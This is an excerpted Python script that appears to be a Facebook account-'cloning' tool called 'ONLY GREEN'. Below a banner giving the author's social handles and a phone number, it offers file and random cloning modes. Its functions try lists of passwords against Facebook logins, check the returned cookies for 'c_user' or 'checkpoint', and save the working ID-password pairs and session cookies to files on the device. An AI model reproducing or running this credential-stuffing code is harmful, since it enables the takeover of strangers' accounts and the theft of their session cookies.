...
════════════════════════════════════════
 ...
 | |__| | | \ \| |____| |____| |\  |
  ...
  \033[32;1m  ════════════════════════════════════════
    ...
    Facebook  : ASIF MAX             
    Whatsapp  : +8801981689521       
    Github    : {K}github.com/KING-CYBER-WORLD{N}    {H}
    Status    : PREMIUM  
    Network   : DATA/WIFI(DATA BEST)
     Version   :  {H} V<>1.0 🟢 {N}{H}
     Tools     : {H}ONLY GREEN   🟢         
    ════════════════════════════════════════""")
    print(f"""{GREEN} [√] GREEN UPDATE DONE!{P}
 {K}[{H}√{K}]{P} This message is for my hatters 
 {K}[{H}√{K}]{P}       {H} I CAN FUCK BETTER THEN YOU!🖕
...
while attemps < 12345677901:
      ...
      if username == 'USERNAME' and password == 'FUCK-FB':
         print('You Have Successfully Logged in.')
         break 
      else:
          print('PLEASE TYPE CORRECT PASSWORD!')
          attemps += 1
          continue 
os.system('clear')
...
def mainx():
    ...
    print(f"{K} [{H}3{K}] {WHITE}File   Cloning(WORKING) ")
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning {H}(WORKING)")
    print(f'{K} [{H}5{K}] {WHITE}Separate Ids ')
    print(f'{K} [{H}6{K}] {WHITE}Remove Duplicate Ids')
    print(f'{K} [{H}7{K}] {N}Follow Github ')
    print(f'{K} [{H}8{K}] {N}Contact With Admin')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/KING-CYBER-WORLD");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/THE.REAL.K1NG");mainx()
    elif mahin in ["0","00"]:
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             open(' /sdcard/ONLY-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                open(' /sdcard/ONLY-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
...
def f1(idf,pwv):
  global loop,ok,cp
  animasi = random.choice(["\x1b[1;91mASIF","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/ONLY-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
...
def m3(idf,pw):
 ...
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mASIF","\x1b[1;92mASIF","\x1b[1;93mASIF","\x1b[1;94mASIF","\x1b[1;95mASIF","\x1b[1;96mASIF","\x1b[1;97mASIF","\x1b[1;91mASIF","\x1b[1;92mASIF","\x1b[1;93mASIF","\x1b[1;94mASIF","\x1b[1;95mASIF","\x1b[1;96mASIF"])
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    ok+=1 
    open(' /sdcard/ONLY-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    open(' /sdcard/ONLY-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
